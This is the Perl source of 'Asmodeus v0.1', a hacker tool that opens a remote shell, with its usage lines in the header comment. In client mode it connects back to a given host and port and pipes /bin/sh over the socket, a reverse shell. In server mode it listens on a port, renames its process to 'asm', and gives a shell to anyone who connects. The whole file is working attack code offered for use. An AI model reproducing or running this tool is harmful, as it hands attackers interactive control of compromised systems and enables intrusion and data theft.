
#

#   Asmodeus v0.1

#   Perl Remote Shell

#   by phuket

#   www.smoking-gnu.org

#

#   (Server is based on some code found on [url=http://www.governmentsecurity.org)]www.governmentsecurity.org)[/url]

#   



#   perl asmodeus.pl client 6666 127.0.0.1

#   perl asmodeus.pl server 6666

#





use Socket;



$cs=$ARGV[0];

$port=$ARGV[1];

$host=$ARGV[2];



if ($cs eq 'client') {&client}

elsif ($cs eq 'server') {&server}









sub client{

socket(TO_SERVER, PF_INET, SOCK_STREAM, getprotobyname('tcp'));

$internet_addr = inet_aton("$host") or die "ALOA:$!\n";

$paddr=sockaddr_in("$port", $internet_addr);

connect(TO_SERVER, $paddr) or die "$port:$internet_addr:$!\n";

open(STDIN, ">&TO_SERVER");

open(STDOUT, ">&TO_SERVER");

open(STDERR, ">&TO_SERVER");

print "Asmodeus Perl Remote Shell\n";

system(date);

system("/bin/sh");

close(TO_SERVER);

}











sub server{

$proto=getprotobyname('tcp');

$0="asm";

$system='/bin/sh';

socket(SERVER, PF_INET, SOCK_STREAM, $proto) or die "socket:$!";

setsockopt(SERVER, SOL_SOCKET, SO_REUSEADDR, pack("l", 1)) or die "setsockopt: $!";

bind(SERVER, sockaddr_in($port, INADDR_ANY)) or die "bind: $!";

listen(SERVER, SOMAXCONN) or die "listen: $!";

for(;$paddr=accept(CLIENT, SERVER);close CLIENT) {

  open(STDIN, ">&CLIENT");

  open(STDOUT, ">&CLIENT");

  open(STDERR, ">&CLIENT");

  print "Asmodeus Perl Remote Shell\n";

  system(date);

  system("/bin/sh");

  close(STDIN);

  close(STDOUT);

  close(STDERR);

  return;

}

}
